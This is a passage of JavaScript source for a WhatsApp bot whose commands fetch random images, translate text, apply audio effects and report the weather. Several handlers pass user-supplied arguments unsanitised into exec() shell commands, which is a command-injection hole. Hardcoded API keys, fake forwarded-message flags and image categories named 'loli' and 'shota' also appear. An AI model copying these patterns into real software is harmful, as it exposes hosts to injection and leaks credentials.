'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
replygcyuta(mess.loading)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'translate':{
  	if (!q) return replygcyuta(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygcyuta(err)
    } 
    }
    break
    case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return replygcyuta('Enter Query Title')
                replygcyuta(mess.loading)
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygcyuta('Enter Query Title')
                replygcyuta(mess.loading)
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
                
            }
            break
    case 'aesthetic':{
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'ebinary': {
if (!q) return replygcyuta(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcyuta(eb)
}
break
case 'dbinary': {
if (!q) return replygcyuta(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcyuta(db)
}
break
			  case 'volaudio': {
if (!args.join(" ")) return replygcyuta(`Example: ${prefix + command} 10`)
media = await Yuta.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcyuta('Error!')
jadie = fs.readFileSync(rname)
Yuta.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcyuta(`Example: ${prefix + command} 10`)
media = await Yuta.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcyuta('Error!')
jadie = fs.readFileSync(rname)
Yuta.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
			case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcyuta(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcyuta(`Example : ${prefix + command} 😅+🤔`)
                replygcyuta(mess.loading)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await Yuta.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcyuta(mess.loading)
                let media = await Yuta.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcyuta(err)
                let buff = fs.readFileSync(ran)
                Yuta.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcyuta(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcyuta(e)
                }
                break
			case 'toonce':
            case 'toviewonce': {
                if (!m.quoted) return replygcyuta(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await Yuta.downloadAndSaveMediaMessage(quoted)
                    Yuta.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await Yuta.downloadAndSaveMediaMessage(quoted)
                    Yuta.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await Yuta.downloadAndSaveMediaMessage(quoted)
                   Yuta.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
			case 'fliptext': {
                if (args.length < 1) return replygcyuta(`Example:\n${prefix}fliptext Yuta-Okkotsu`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcyuta(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
			case 'style': case 'styletext': {
		if (!text) return replygcyuta('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcyuta(teks)
	    }
	    break
			case 'obfus': case 'obfuscate':{
if (!text) return replygcyuta(`Example ${prefix+command} const xeonbot = require('baileys')`)
try {
let meg = await obfus(text)
replygcyuta(`Success
${meg.result}`)
} catch {
	replygcyuta(`Use the command properly\nExample ${prefix+command} const xeonbot = require('baileys')`)
}
}
break
			case 'autodownload': case 'autodl':
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                
                if (q == 'on') {
                    db.data.settings[botNumber].autodownload = true
                    replygcyuta(`Successfully Changed Auto Download To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autodownload = false
                    replygcyuta(`Successfully Changed Auto Download To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'weather':{
if (!text) return replygcyuta('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           Yuta.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'happymod':{
if (!q) return replygcyuta(`Example ${prefix+command} Sufway surfer mod`)
replygcyuta(mess.loading)
let kat = await scp2.happymod(q)
